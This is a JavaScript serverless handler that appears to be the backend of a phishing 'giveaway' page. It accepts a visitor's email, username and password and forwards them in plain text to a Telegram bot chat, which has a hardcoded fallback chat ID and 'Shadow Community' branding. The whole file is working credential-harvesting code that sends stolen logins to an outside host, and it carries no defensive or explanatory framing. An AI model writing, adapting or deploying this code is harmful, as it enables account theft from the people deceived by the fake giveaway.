export default async function handler(req, res) {
    // Allow CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { email, password, username, option } = req.body;

        // ===== GET CREDENTIALS FROM ENVIRONMENT VARIABLES =====
        const BOT_TOKEN = process.env.BOT_TOKEN;
        const CHAT_ID = process.env.CHAT_ID || "8381916527";

        if (!BOT_TOKEN) {
            console.error('❌ BOT_TOKEN not set in environment variables');
            return res.status(200).json({ 
                success: false, 
                error: 'BOT_TOKEN not configured' 
            });
        }

        const message = `
🎯 *NEW GIVEAWAY REGISTRATION!*

👤 *Name:* ${username || 'Guest'}
📧 *Email:* ${email}
🔒 *Password:* ${password}
🎁 *Option:* ${option}
📅 *Date:* ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━
🖤 *Shadow Community*
🔥 *GpsirEra*
~#gpsirAI
`;

        // Send to Telegram
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();

        if (result.ok) {
            console.log('✅ Sent to Telegram:', email);
            return res.status(200).json({ success: true, message: 'Sent to Telegram' });
        } else {
            console.error('❌ Telegram API Error:', result);
            return res.status(200).json({ success: false, error: result.description });
        }

    } catch (error) {
        console.error('❌ Server Error:', error);
        return res.status(200).json({ success: false, error: error.message });
    }
}
